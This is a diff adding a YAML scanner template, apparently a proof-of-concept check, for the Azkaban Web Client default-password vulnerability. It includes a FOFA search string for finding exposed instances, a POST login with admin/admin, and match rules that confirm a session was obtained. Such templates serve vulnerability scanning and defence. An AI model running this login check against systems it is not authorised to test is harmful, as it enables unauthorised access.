@@ -1,0 +1,19 @@
+id: poc-yaml-azkaban-web-client-default-login
+info:
+  name: Azkaban web客户端 默认密码登录漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: azkaban
+  fofa: body="Azkaban Web Client"
+requests:
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: action=login&username=admin&password=admin
+  expression: status_code == 200 && matches(body,"\"session.id\" \x3a \"(.*?)\"")
+    && contains(body,"\"status\" \x3a \"success\"") && contains(headers,"azkaban.browser.session.id=")
+    && contains(content_type,"application/json")
+variables: {}
+transport: http
